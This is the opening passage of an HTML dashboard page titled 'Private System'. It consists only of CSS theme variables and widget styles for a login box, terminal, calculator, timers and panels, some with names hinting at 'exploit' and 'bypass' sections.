<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Private System</title>
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Orbitron:wght@400;700&family=Press+Start+2P&display=swap" rel="stylesheet">
  <style>
    /* CSS Variables for Theming */
    :root {
      --bg-color: #1a1a1a;
      --text-color: #f9f2dc;
      --header-bg: #ff914d;
      --header-text: #000;
      --quickbar-btn-bg: #ff914d;
      --quickbar-btn-hover-bg: #ffb67a;
      --box-bg: #2a2a2a;
      --box-shadow: 0 0 15px rgba(255, 145, 77, 0.3);
      --box-h2-color: #ffbf80;
      --update-entry-bg: #40210f;
      --update-entry-text: #ffccb3;
      --calendar-cell-bg: #333;
      --calendar-today-bg: #ff914d;
      --calendar-today-text: black;
      --motivation-box-bg: #333;
      --motivation-box-text: #ffd966;
      --info-panel-bg: #2a2a2a;
      --info-panel-h2-color: #ff914d;
      --coming-soon-bg: #40210f;
      --info-text-bg: #40210f;
      --button-hover-brightness: 1.2; /* For all buttons */
      --panic-btn-bg: #ff4c4c;
      --panic-btn-text: white;
      --input-bg: #1c1c1c;
      --input-text: white;
      --login-box-border: white;
      --login-box-shadow: 0 0 15px white;
      --error-color: red;
      --popup-bg: black;
      --popup-border: white;
      --popup-shadow: 0 0 20px white;
      --announcement-bg: #ff914d;
      --announcement-text: black;
      --reminder-item-bg: #3c3c3c;
      --reminder-item-border: #ff914d;
      --reminder-item-text: #f9f2dc;
      --reminder-completed-bg: #2a402a;
      --reminder-completed-text: #a0ffa0;
      --progress-bar-bg: #444;
      --progress-bar-fill: #ff914d;
      --terminal-bg: #000;
      --terminal-text: #0f0;
      --terminal-input-bg: #111;
      --terminal-input-border: #0f0;
      --terminal-prompt: #0a0;
      --notification-bg: #2a2a2a;
      --notification-text: #f9f2dc;
      --notification-success: #2ecc71;
      --notification-error: #e74c3c;
      --notification-warning: #f1c40f;
    }

    /* Light Theme */
    body.light-theme {
      --bg-color: #f9f2dc;
      --text-color: #1a1a1a;
      --header-bg: #ffd966;
      --header-text: #000;
      --quickbar-btn-bg: #ffd966;
      --quickbar-btn-hover-bg: #ffeb99;
      --box-bg: #fff3cc;
      --box-shadow: 0 0 15px rgba(255, 145, 77, 0.6);
      --box-h2-color: #994d00;
      --update-entry-bg: #ffd999;
      --update-entry-text: #994d00;
      --calendar-cell-bg: #ffd966;
      --calendar-today-bg: #994d00;
      --calendar-today-text: #ffd966;
      --motivation-box-bg: #fff3cc;
      --motivation-box-text: #994d00;
      --info-panel-bg: #ffd966;
      --info-panel-h2-color: #994d00;
      --coming-soon-bg: #ffd999;
      --info-text-bg: #ffd999;
      --input-bg: #e0e0e0;
      --input-text: #333;
      --announcement-bg: #ffd966;
      --announcement-text: #000;
      --reminder-item-bg: #f5f5f5;
      --reminder-item-border: #994d00;
      --reminder-item-text: #1a1a1a;
      --reminder-completed-bg: #e0f2f1;
      --reminder-completed-text: #1b5e20;
      --progress-bar-bg: #ccc;
      --progress-bar-fill: #994d00;
      --terminal-bg: #eee;
      --terminal-text: #333;
      --terminal-input-bg: #fff;
      --terminal-input-border: #333;
      --terminal-prompt: #666;
      --notification-bg: #f9f9f9;
      --notification-text: #1a1a1a;
    }

    /* Matrix Green Theme */
    body.matrix-theme {
      --bg-color: #0d0d0d;
      --text-color: #00ff00;
      --header-bg: #0a0a0a;
      --header-text: #00ff00;
      --quickbar-btn-bg: #006600;
      --quickbar-btn-hover-bg: #009900;
      --box-bg: #1a1a1a;
      --box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
      --box-h2-color: #00cc00;
      --update-entry-bg: #003300;
      --update-entry-text: #00ff00;
      --calendar-cell-bg: #111;
      --calendar-today-bg: #00ff00;
      --calendar-today-text: black;
      --motivation-box-bg: #151515;
      --motivation-box-text: #00ff00;
      --info-panel-bg: #1a1a1a;
      --info-panel-h2-color: #00ff00;
      --coming-soon-bg: #003300;
      --info-text-bg: #003300;
      --input-bg: #001a00;
      --input-text: #00ff00;
      --login-box-border: #00ff00;
      --login-box-shadow: 0 0 15px #00ff00;
      --error-color: #ff0000;
      --popup-bg: #000;
      --popup-border: #00ff00;
      --popup-shadow: 0 0 20px #00ff00;
      --announcement-bg: #004400;
      --announcement-text: #00ff00;
      --reminder-item-bg: #050505;
      --reminder-item-border: #00ff00;
      --reminder-item-text: #00ff00;
      --reminder-completed-bg: #002200;
      --reminder-completed-text: #00aa00;
      --progress-bar-bg: #002200;
      --progress-bar-fill: #00ff00;
      --terminal-bg: #000;
      --terminal-text: #0f0;
      --terminal-input-bg: #001a00;
      --terminal-input-border: #0f0;
      --terminal-prompt: #0a0;
      --notification-bg: #050505;
      --notification-text: #00ff00;
    }

    /* Cyber Purple Theme */
    body.cyber-theme {
        --bg-color: #100018;
        --text-color: #e0b0ff;
        --header-bg: #300050;
        --header-text: #e0b0ff;
        --quickbar-btn-bg: #6a0dad;
        --quickbar-btn-hover-bg: #8a2be2;
        --box-bg: #200030;
        --box-shadow: 0 0 15px rgba(138, 43, 226, 0.5);
        --box-h2-color: #a020f0;
        --update-entry-bg: #400060;
        --update-entry-text: #d080ff;
        --calendar-cell-bg: #250035;
        --calendar-today-bg: #a020f0;
        --calendar-today-text: white;
        --motivation-box-bg: #280038;
        --motivation-box-text: #e0b0ff;
        --info-panel-bg: #200030;
        --info-panel-h2-color: #a020f0;
        --coming-soon-bg: #400060;
        --info-text-bg: #400060;
        --input-bg: #150020;
        --input-text: #e0b0ff;
        --login-box-border: #a020f0;
        --login-box-shadow: 0 0 15px #a020f0;
        --error-color: #ff4c4c;
        --popup-bg: #100018;
        --popup-border: #a020f0;
        --popup-shadow: 0 0 20px #a020f0;
        --announcement-bg: #450070;
        --announcement-text: #e0b0ff;
        --reminder-item-bg: #1a002a;
        --reminder-item-border: #a020f0;
        --reminder-item-text: #e0b0ff;
        --reminder-completed-bg: #2a003a;
        --reminder-completed-text: #c080ff;
        --progress-bar-bg: #200030;
        --progress-bar-fill: #a020f0;
        --terminal-bg: #100018;
        --terminal-text: #e0b0ff;
        --terminal-input-bg: #150020;
        --terminal-input-border: #e0b0ff;
        --terminal-prompt: #8a2be2;
        --notification-bg: #1a002a;
        --notification-text: #e0b0ff;
    }


    /* Global Styles */
    * {
      box-sizing: border-box;
      font-family: 'Montserrat', sans-serif;
      transition: background-color 0.3s ease, color 0.3s ease, border-color 0.3s ease, box-shadow 0.3s ease;
    }
    
    body {
      margin: 0; padding: 0;
      background-color: var(--bg-color);
      color: var(--text-color);
      transition: background-color 0.3s, color 0.3s;
      zoom: 1; /* Initial zoom level */
      overflow-x: hidden; /* Prevent horizontal scroll */
    }

    body.login-body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    /* Loading Overlay */
    #loadingOverlay {
        position: fixed;
        top: 0; left: 0;
        width: 100%; height: 100%;
        background-color: var(--bg-color);
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 9999;
        flex-direction: column;
        gap: 20px;
        opacity: 1;
        visibility: visible;
        transition: opacity 0.5s ease, visibility 0.5s ease;
    }

    #loadingOverlay.hidden {
        opacity: 0;
        visibility: hidden;
    }

    .spinner {
        border: 8px solid var(--box-bg);
        border-top: 8px solid var(--header-bg);
        border-radius: 50%;
        width: 60px;
        height: 60px;
        animation: spin 1s linear infinite;
    }

    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }

    .loading-text {
        color: var(--text-color);
        font-size: 1.2em;
        font-family: 'Orbitron', sans-serif;
    }

    /* Notifications / Toasts */
    #notificationContainer {
        position: fixed;
        top: 20px;
        right: 20px;
        z-index: 10000;
        display: flex;
        flex-direction: column;
        gap: 10px;
    }

    .notification {
        background-color: var(--notification-bg);
        color: var(--notification-text);
        padding: 15px 20px;
        border-radius: 8px;
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
        opacity: 0;
        transform: translateX(100%);
        animation: slideInNotification 0.5s forwards, fadeOutNotification 0.5s 4.5s forwards;
        min-width: 250px;
        max-width: 350px;
        display: flex;
        align-items: center;
        gap: 10px;
    }

    .notification.success { border-left: 5px solid var(--notification-success); }
    .notification.error { border-left: 5px solid var(--notification-error); }
    .notification.warning { border-left: 5px solid var(--notification-warning); }
    .notification.info { border-left: 5px solid var(--header-bg); }

    .notification-icon {
        font-size: 1.5em;
        line-height: 1;
    }

    @keyframes slideInNotification {
        0% { transform: translateX(100%); opacity: 0; }
        100% { transform: translateX(0); opacity: 1; }
    }

    @keyframes fadeOutNotification {
        0% { opacity: 1; }
        100% { opacity: 0; visibility: hidden; }
    }

    /* Login System Styles */
    .login-box {
      background: #000;
      border-radius: 20px;
      border: 3px solid var(--login-box-border);
      box-shadow: var(--login-box-shadow);
      width: 360px;
      padding: 30px 25px;
      text-align: center;
      position: relative;
      transition: border-color 0.3s, box-shadow 0.3s;
    }
    
    .login-box.flashing {
      animation: flashRed 0.4s ease-in-out 2;
    }
    
    @keyframes flashRed {
      0%, 100% { border-color: var(--error-color); box-shadow: 0 0 15px var(--error-color); }
      50% { border-color: var(--login-box-border); box-shadow: var(--login-box-shadow); }
    }
    
    .login-box h2 {
      font-size: 1.7em;
      margin-bottom: 20px;
      font-family: 'Press Start 2P', monospace;
      color: var(--text-color);
    }
    
    .login-box input {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      background: var(--input-bg);
      border: none;
      color: var(--input-text);
      border-radius: 8px;
      font-size: 1em;
    }
    .login-box input::placeholder {
      color: rgba(255, 255, 255, 0.6);
    }
    
    .login-box label {
      display: flex;
      align-items: center;
      font-size: 0.9em;
      margin-bottom: 10px;
      gap: 10px;
      cursor: pointer;
      color: var(--text-color);
    }
    
    #showPassword:checked + span {
      color: var(--error-color);
    }
    
    .login-box button {
      width: 100%;
      padding: 12px;
      background-color: var(--error-color);
      color: white;
      font-size: 1em;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.2s;
    }

    .login-box button:hover:not(:disabled) {
      filter: brightness(var(--button-hover-brightness));
    }
    
    .attempt-counter, .error-message {
      margin-top: 10px;
      font-size: 0.85em;
      color: var(--error-color);
    }
    
    .popup {
      display: none;
      position: absolute;
      top: 50%;
      left: 50%;
      width: 320px;
      padding: 20px;
      transform: translate(-50%, -50%);
      background: var(--popup-bg);
      border: 3px solid var(--popup-border);
      border-radius: 15px;
      box-shadow: var(--popup-shadow);
      z-index: 10;
    }
    
    .popup input {
      margin-bottom: 15px;
    }

    /* Dashboard Styles */
    body.dashboard-body {
      padding: 20px;
      overflow-y: auto; /* Allow scrolling for dashboard content */
    }

    .dashboard-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      background: var(--header-bg);
      padding: 15px 25px;
      border-radius: 12px;
      color: var(--header-text);
      margin-bottom: 20px;
    }

    .dashboard-header h1 {
      font-size: 24px;
      font-family: 'Orbitron', sans-serif; /* Use a distinct font for dashboard header */
      margin: 0;
    }

    .user-info {
      font-weight: bold;
    }

    .version-box {
      background: var(--header-bg); /* Use header-bg for consistency */
      padding: 8px 15px;
      border-radius: 8px;
      color: var(--header-text);
      font-weight: bold;
      border: 1px solid rgba(0,0,0,0.2);
    }

    .quick-bar {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-bottom: 10px; 
      flex-wrap: wrap;
    }

    .quick-bar button {
      background-color: var(--quickbar-btn-bg);
      border: none;
      padding: 10px 14px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s, transform 0.1s;
      min-width: 110px;
      white-space: nowrap;
    }

    .quick-bar button:hover {
      background-color: var(--quickbar-btn-hover-bg);
      transform: translateY(-2px);
    }

    #panicBtn {
      background: var(--panic-btn-bg) !important;
      color: var(--panic-btn-text) !important;
    }
    #panicBtn:hover {
      filter: brightness(var(--button-hover-brightness));
    }

    .announcement-bar {
      width: 100%;
      background-color: var(--announcement-bg);
      color: var(--announcement-text);
      font-weight: bold;
      padding: 10px 0;
      overflow: hidden;
      position: relative;
      border-radius: 8px;
      box-sizing: border-box;
      margin-bottom: 20px;
      user-select: none;
      height: 30px;
      line-height: 13px;
    }

    .announcement-bar span {
      display: inline-block;
      white-space: nowrap;
      position: absolute;
      will-change: transform;
      animation: scrollLeft 15s linear infinite;
      padding-left: 100%;
    }

    @keyframes scrollLeft {
      0% {
        transform: translateX(0%);
      }
      100% {
        transform: translateX(-100%);
      }
    }

    /* Main Grid Layout */
    .main-row {
      display: flex;
      gap: 20px;
      margin-bottom: 20px;
      flex-wrap: wrap;
      transition: opacity 0.3s ease, transform 0.3s ease;
    }
    .main-row.hidden {
      opacity: 0;
      transform: translateY(20px);
    }

    .box {
      background-color: var(--box-bg);
      padding: 20px;
      border-radius: 12px;
      box-shadow: var(--box-shadow);
      min-height: 120px;
      transition: background-color 0.3s, color 0.3s, transform 0.2s ease;
      flex: 1 1 300px;
    }
    .box:hover {
      transform: translateY(-5px);
    }

    .box h2 {
      font-size: 18px;
      margin-bottom: 10px;
      color: var(--box-h2-color);
      font-family: 'Orbitron', sans-serif;
    }

    .box p, .box ul {
      font-size: 14px;
    }

    .update-entry {
      background: var(--update-entry-bg);
      padding: 8px;
      margin-top: 5px;
      border-radius: 6px;
      color: var(--update-entry-text);
    }

    .calendar {
      display: grid;
      grid-template-columns: repeat(7, 1fr);
      gap: 5px;
      margin-top: 10px;
      text-align: center;
      font-size: 12px;
    }

    .calendar div {
      padding: 6px;
      background: var(--calendar-cell-bg);
      border-radius: 4px;
    }

    .today {
      background: var(--calendar-today-bg) !important;
      font-weight: bold;
      color: var(--calendar-today-text) !important;
      animation: pulseToday 1.5s infinite alternate;
    }

    @keyframes pulseToday {
        0% { transform: scale(1); box-shadow: none; }
        100% { transform: scale(1.05); box-shadow: 0 0 10px var(--calendar-today-bg); }
    }

    #canvasContainer {
      display: none;
      margin-top: 20px;
      text-align: center;
      background-color: var(--box-bg);
      padding: 20px;
      border-radius: 12px;
      box-shadow: var(--box-shadow);
      animation: fadeIn 0.5s ease-out;
    }
    @keyframes fadeIn {
        from { opacity: 0; transform: translateY(20px); }
        to { opacity: 1; transform: translateY(0); }
    }

    #notesCanvas {
      border: 2px solid var(--header-bg);
      border-radius: 12px;
      background: #fff;
      cursor: crosshair;
      touch-action: none;
      width: 100%; /* Make canvas responsive */
      max-width: 600px; /* Max width as before */
      height: 400px; /* Fixed height for simplicity */
    }

    #canvasControls {
      margin-top: 10px;
    }

    #canvasControls button {
      background-color: var(--quickbar-btn-bg);
      border: none;
      padding: 8px 16px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
      margin: 0 5px;
    }

    #canvasControls button:hover {
      background-color: var(--quickbar-btn-hover-bg);
    }

    .motivation-box {
      background-color: var(--motivation-box-bg);
      color: var(--motivation-box-text);
      padding: 20px;
      border-radius: 12px;
      font-style: italic;
      font-size: 16px;
      box-shadow: 0 0 12px rgba(255, 145, 77, 0.5);
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 120px;
      text-align: center;
      flex: 1 1 300px;
      position: relative; /* For dynamic quotes */
      overflow: hidden;
    }
    .motivation-quote {
        opacity: 0;
        transform: translateY(20px);
        animation: slideInQuote 0.7s forwards;
    }
    @keyframes slideInQuote {
        from { opacity: 0; transform: translateY(20px); }
        to { opacity: 1; transform: translateY(0); }
    }

    /* Info Panel Styles */
    .info-panel {
      display: none;
      background-color: var(--info-panel-bg);
      padding: 20px;
      border-radius: 12px;
      margin-top: 20px;
      box-shadow: var(--box-shadow);
      animation: panelSlideIn 0.4s ease-out forwards;
    }
    .info-panel.hidden { /* For toggle sections functionality */
        display: none !important;
    }

    @keyframes panelSlideIn {
        from { opacity: 0; transform: translateY(20px); }
        to { opacity: 1; transform: translateY(0); }
    }

    .info-panel h2 {
      color: var(--info-panel-h2-color);
      margin-bottom: 15px;
      font-family: 'Orbitron', sans-serif;
    }

    .wifi-grid, .wifi-entry {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(100px, 1fr)); /* Responsive grid */
      gap: 10px;
      margin-bottom: 15px;
    }

    .wifi-grid div {
      padding: 8px;
      background: var(--calendar-cell-bg);
      border-radius: 6px;
      text-align: center;
      font-weight: bold;
    }

    .wifi-entry div {
      padding: 8px;
      background: var(--update-entry-bg);
      border-radius: 6px;
      text-align: center;
    }

    .handbook-buttons, .links-list, .exploit-buttons, .bypass-buttons {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); /* Responsive grid */
      gap: 10px;
      margin-top: 15px;
    }

    .handbook-buttons button, .links-list a, .exploit-buttons a, .bypass-buttons button {
      background-color: var(--quickbar-btn-bg);
      border: none;
      padding: 12px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s, transform 0.1s;
      text-decoration: none;
      text-align: center;
    }

    .handbook-buttons button:hover, .links-list a:hover, .exploit-buttons a:hover, .bypass-buttons button:hover {
      background-color: var(--quickbar-btn-hover-bg);
      transform: translateY(-2px);
    }

    .coming-soon, .info-text {
      background: var(--coming-soon-bg);
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
      text-align: center;
      font-weight: bold;
    }

    .school-info-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
      gap: 10px;
      margin-top: 15px;
    }

    .school-info-item {
      background: var(--update-entry-bg);
      padding: 12px;
      border-radius: 8px;
    }

    .school-info-label {
      font-weight: bold;
      color: var(--info-panel-h2-color);
      margin-bottom: 5px;
    }

    .ipad-options {
      display: flex;
      gap: 10px;
      margin-top: 15px;
      flex-wrap: wrap; /* Make options responsive */
    }

    .ipad-options button {
      flex: 1;
      min-width: 120px; /* Ensure buttons don't get too small */
      background-color: var(--quickbar-btn-bg);
      border: none;
      padding: 12px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
    }

    .ipad-options button:hover {
      background-color: var(--quickbar-btn-hover-bg);
    }

    .ipad-content, .bypass-content {
      display: none;
      background: var(--update-entry-bg);
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
    }

    /* Reminder System Styles */
    #reminderPanel {
        animation: panelSlideIn 0.4s ease-out forwards;
    }
    #reminderList {
        margin-top: 15px;
    }
    .reminder-item {
        display: flex;
        align-items: center;
        background-color: var(--reminder-item-bg);
        border: 1px solid var(--reminder-item-border);
        padding: 10px 15px;
        margin-bottom: 10px;
        border-radius: 8px;
        color: var(--reminder-item-text);
        box-shadow: 0 2px 5px rgba(0,0,0,0.2);
        transition: all 0.3s ease;
        animation: slideInReminder 0.3s ease-out;
    }
    .reminder-item.completed {
        background-color: var(--reminder-completed-bg);
        color: var(--reminder-completed-text);
        text-decoration: line-through;
        opacity: 0.7;
        border-color: rgba(0,255,0,0.5);
    }
    .reminder-item p {
        flex-grow: 1;
        margin: 0;
    }
    .reminder-item .actions {
        display: flex;
        gap: 8px;
        margin-left: 15px;
    }
    .reminder-item .actions button {
        background: transparent;
        border: none;
        color: var(--reminder-item-text);
        font-size: 1.1em;
        cursor: pointer;
        transition: color 0.2s;
    }
    .reminder-item.completed .actions button {
        color: var(--reminder-completed-text);
    }
    .reminder-item .actions button:hover {
        color: var(--info-panel-h2-color);
        transform: scale(1.1);
    }
    @keyframes slideInReminder {
        from { opacity: 0; transform: translateX(-20px); }
        to { opacity: 1; transform: translateX(0); }
    }

    /* System Status Panel Styles */
    .status-grid {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
        gap: 15px;
        margin-top: 15px;
    }
    .status-item {
        background: var(--update-entry-bg);
        padding: 15px;
        border-radius: 8px;
        text-align: center;
    }
    .status-item .label {
        font-weight: bold;
        color: var(--info-panel-h2-color);
        margin-bottom: 8px;
    }
    .status-item .value {
        font-size: 1.2em;
        color: var(--text-color);
    }
    .progress-bar-container {
        width: 100%;
        background-color: var(--progress-bar-bg);
        border-radius: 5px;
        height: 10px;
        margin-top: 5px;
        overflow: hidden;
    }
    .progress-bar-fill {
        height: 100%;
        background-color: var(--progress-bar-fill);
        width: 0%;
        border-radius: 5px;
        transition: width 0.5s ease-out;
    }

    /* File Manager Panel Styles */
    .file-manager-container {
        display: flex;
        flex-direction: column;
        gap: 10px;
        margin-top: 15px;
    }
    .file-manager-controls {
        display: flex;
        gap: 10px;
        flex-wrap: wrap;
    }
    .file-manager-controls button {
        background-color: var(--quickbar-btn-bg);
        border: none;
        padding: 8px 12px;
        border-radius: 6px;
        color: black;
        font-weight: bold;
        cursor: pointer;
        transition: background 0.2s;
    }
    .file-manager-controls button:hover {
        background-color: var(--quickbar-btn-hover-bg);
    }
    .file-manager-path {
        background: var(--update-entry-bg);
        padding: 8px 12px;
        border-radius: 6px;
        color: var(--text-color);
        font-family: 'Courier New', monospace;
    }
    .file-list {
        background: var(--box-bg);
        border-radius: 8px;
        padding: 10px;
        min-height: 200px;
        max-height: 400px;
        overflow-y: auto;
        border: 1px solid var(--box-h2-color);
    }
    .file-item {
        display: flex;
        align-items: center;
        padding: 8px;
        border-bottom: 1px solid rgba(255,255,255,0.1);
        cursor: pointer;
        transition: background-color 0.2s;
    }
    .file-item:last-child {
        border-bottom: none;
    }
    .file-item:hover {
        background-color: rgba(255,255,255,0.05);
    }
    .file-item-icon {
        margin-right: 10px;
        font-size: 1.2em;
        color: var(--box-h2-color);
    }
    .file-item.folder .file-item-icon { color: #ffd700; } /* Gold for folders */
    .file-item.text .file-item-icon { color: #87ceeb; } /* Light blue for text */
    .file-item.image .file-item-icon { color: #98fb98; } /* Pale green for images */
    .file-item.exe .file-item-icon { color: #ff6347; } /* Tomato for executables */

    /* Terminal Panel Styles */
    #terminalPanel {
        font-family: 'Courier New', monospace;
    }
    .terminal-output {
        background-color: var(--terminal-bg);
        color: var(--terminal-text);
        min-height: 250px;
        max-height: 400px;
        overflow-y: auto;
        border-radius: 8px;
        padding: 10px;
        margin-bottom: 10px;
        white-space: pre-wrap;
        word-break: break-all;
    }
    .terminal-input-container {
        display: flex;
        align-items: center;
    }
    .terminal-prompt {
        color: var(--terminal-prompt);
        margin-right: 5px;
    }
    #terminalInput {
        flex-grow: 1;
        background-color: var(--terminal-input-bg);
        border: 1px solid var(--terminal-input-border);
        color: var(--terminal-text);
        padding: 8px;
        border-radius: 4px;
        font-family: 'Courier New', monospace;
    }
    #terminalInput:focus {
        outline: none;
        box-shadow: 0 0 5px var(--terminal-input-border);
    }
    .terminal-output .error {
        color: var(--error-color);
    }
    .terminal-output .success {
        color: var(--notification-success);
    }
    .terminal-output .warning {
        color: var(--notification-warning);
    }

    /* Weather Panel Styles */
    .weather-widget {
        display: flex;
        flex-direction: column;
        align-items: center;
        gap: 10px;
        margin-top: 15px;
        background: var(--update-entry-bg);
        padding: 20px;
        border-radius: 8px;
    }
    .weather-icon {
        font-size: 3em;
        color: var(--box-h2-color);
    }
    .weather-temp {
        font-size: 2.5em;
        font-weight: bold;
        color: var(--text-color);
    }
    .weather-description, .weather-location {
        font-size: 1.1em;
        color: var(--update-entry-text);
    }

    /* Calculator Panel Styles */
    .calculator-grid {
        display: grid;
        grid-template-columns: repeat(4, 1fr);
        gap: 8px;
        width: 100%;
        max-width: 300px;
        margin: 15px auto 0;
        background: var(--update-entry-bg);
        padding: 10px;
        border-radius: 8px;
    }
    #calcDisplay {
        grid-column: 1 / -1;
        background-color: var(--input-bg);
        color: var(--input-text);
        font-size: 2em;
        padding: 10px;
        border-radius: 6px;
        text-align: right;
        margin-bottom: 5px;
        height: 50px;
        display: flex;
        align-items: center;
        justify-content: flex-end;
        overflow-x: auto;
    }
    .calculator-grid button {
        background-color: var(--quickbar-btn-bg);
        border: none;
        padding: 15px;
        border-radius: 6px;
        color: black;
        font-size: 1.2em;
        cursor: pointer;
        transition: background-color 0.2s;
    }
    .calculator-grid button:hover {
        background-color: var(--quickbar-btn-hover-bg);
    }
    .calculator-grid button.operator {
        background-color: var(--info-panel-h2-color);
        color: white;
    }
    .calculator-grid button.operator:hover {
        filter: brightness(var(--button-hover-brightness));
    }
    .calculator-grid button.equals {
        background-color: var(--panic-btn-bg);
        color: white;
    }
    .calculator-grid button.equals:hover {
        filter: brightness(var(--button-hover-brightness));
    }
    .calculator-grid button.clear {
        background-color: #f44336; /* Red for clear */
        color: white;
    }
    .calculator-grid button.clear:hover {
        filter: brightness(var(--button-hover-brightness));
    }

    /* Stopwatch and Timer Panel Styles */
    .time-utility-controls {
        display: flex;
        justify-content: center;
        gap: 15px;
        margin-top: 15px;
    }
    .time-utility-box {
        background: var(--update-entry-bg);
        padding: 20px;
        border-radius: 8px;
        text-align: center;
        flex: 1;
        min-width: 250px;
    }
    .time-display {
        font-family: 'Orbitron', sans-serif;
        font-size: 3em;
        margin-bottom: 15px;
        color: var(--text-color);
    }
    .time-utility-buttons button {
        background-color: var(--quickbar-btn-bg);
        border: none;
        padding: 10px 15px;
        border-radius: 6px;
        color: black;
        font-weight: bold;
        cursor: pointer;
        margin: 5px;
        transition: background-color 0.2s;
    }
    .time-utility-buttons button:hover {
        background-color: var(--quickbar-btn-hover-bg);
    }
    #timerInput {
        width: 100px;
        padding: 8px;
        border-radius: 4px;
        border: 1px solid var(--box-h2-color);
        background-color: var(--input-bg);
        color: var(--input-text);
        text-align: center;
        margin-bottom: 10px;
    }

    /* Unit Converter Panel Styles */
    .unit-converter-grid {
        display: grid;
        grid-template-columns: 1fr 1fr;
        gap: 15px;
        margin-top: 15px;
    }
    .unit-converter-input, .unit-converter-output {
        background: var(--update-entry-bg);
        padding: 15px;
        border-radius: 8px;
    }
    .unit-converter-input label, .unit-converter-output label {
        display: block;
        margin-bottom: 8px;
        color: var(--box-h2-color);
        font-weight: bold;
    }
    .unit-converter-input input, .unit-converter-input select {
        width: 100%;
        padding: 8px;
        border-radius: 4px;
        border: 1px solid var(--box-h2-color);
        background-color: var(--input-bg);
        color: var(--input-text);
        margin-bottom: 10px;
    }
    #convertedValue {
        font-size: 1.5em;
        font-weight: bold;
        color: var(--text-color);
    }
    #convertBtn {
        background-color: var(--quickbar-btn-bg);
        border: none;
        padding: 10px 15px;
        border-radius: 6px;
        color: black;
        font-weight: bold;
        cursor: pointer;
        transition: background-color 0.2s;
        width: 100%;
    }
    #convertBtn:hover {
        background-color: var(--quickbar-btn-hover-bg);
    }

    /* Secure Notes Panel Styles */
    #secureNotesPanel textarea {
        width: 100%;
        min-height: 200px;
        background-color: var(--input-bg);
        color: var(--input-text);
        border: 1px solid var(--box-h2-color);
        border-radius: 8px;
        padding: 10px;
        margin-top: 15px;
        resize: vertical;
    }
    #secureNotesPanel .controls {
        margin-top: 10px;
        text-align: right;
    }
    #secureNotesPanel .controls button {
        background-color: var(--quickbar-btn-bg);
        border: none;
        padding: 10px 15px;
        border-radius: 6px;
        color: black;
        font-weight: bold;
        cursor: pointer;
        transition: background-color 0.2s;
        margin-left: 10px;
    }
    #secureNotesPanel .controls button:hover {
        background-color: var(--quickbar-btn-hover-bg);
    }

    /* Activity Log Panel Styles */
    .activity-log-display {
        background: var(--update-entry-bg);
        padding: 15px;
        border-radius: 8px;
        margin-top: 15px;
        min-height: 200px;
        max-height: 400px;
        overflow-y: auto;
        font-family: 'Courier New', monospace;
    }
    .log-entry {
        margin-bottom: 5px;
        border-bottom: 1px dashed rgba(255,255,255,0.1);
        padding-bottom: 5px;
    }
    .log-entry:last-child {
        border-bottom: none;
    }
    .log-timestamp {
        color: var(--box-h2-color);
        font-weight: bold;
        margin-right: 10px;
    }
    .log-message {
        color: var(--text-color);
    }

    /* News Feed Panel Styles */
    .news-feed-container {
        margin-top: 15px;
    }
    .news-item {
        background: var(--update-entry-bg);
        padding: 12px;
        border-radius: 8px;
        margin-bottom: 10px;
        transition: transform 0.2s ease;
    }
    .news-item:hover {
        transform: translateX(5px);
    }
    .news-item h3 {
        margin: 0 0 5px 0;
        color: var(--info-panel-h2-color);
        font-size: 1.1em;
    }
    .news-item p {
        margin: 0;
        font-size: 0.9em;
        color: var(--update-entry-text);
    }
    .news-item a {
        color: var(--quickbar-btn-bg);
        text-decoration: none;
        font-weight: bold;
    }
    .news-item a:hover {
        text-decoration: underline;
    }
    .news-refresh-btn {
        display: block;
        width: 100%;
        background-color: var(--quickbar-btn-bg);
        border: none;
        padding: 10px 15px;
        border-radius: 6px;
        color: black;
        font-weight: bold;
        cursor: pointer;
        transition: background-color 0.2s;
        margin-top: 10px;
    }
    .news-refresh-btn:hover {
        background-color: var(--quickbar-btn-hover-bg);
    }

    /* User Profile Panel Styles */
    .profile-info-grid {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
        gap: 15px;
        margin-top: 15px;
    }
    .profile-info-item {
        background: var(--update-entry-bg);
        padding: 15px;
        border-radius: 8px;
    }
    .profile-info-label {
        font-weight: bold;
        color: var(--info-panel-h2-color);
        margin-bottom: 5px;
    }
    .profile-avatar {
        width: 80px;
        height: 80px;
        border-radius: 50%;
        background-color: var(--box-bg);
        display: flex;
        justify-content: center;
        align-items: center;
        font-size: 2em;
        margin: 0 auto 15px;
        border: 2px solid var(--info-panel-h2-color);
    }
    .profile-settings-btn {
        background-color: var(--quickbar-btn-bg);
        border: none;
        padding: 10px 15px;
        border-radius: 6px;
        color: black;
        font-weight: bold;
        cursor: pointer;
        transition: background-color 0.2s;
        margin-top: 10px;
        width: 100%;
    }
    .profile-settings-btn:hover {
        background-color: var(--quickbar-btn-hover-bg);
    }

    /* Particle Background (Optional, if performance allows) */
    #particles-js {
        position: fixed;
        width: 100%;
        height: 100%;
        background-color: transparent;
        z-index: -1;
        top: 0;
        left: 0;
    }

    /* General Button Styling for New Buttons */
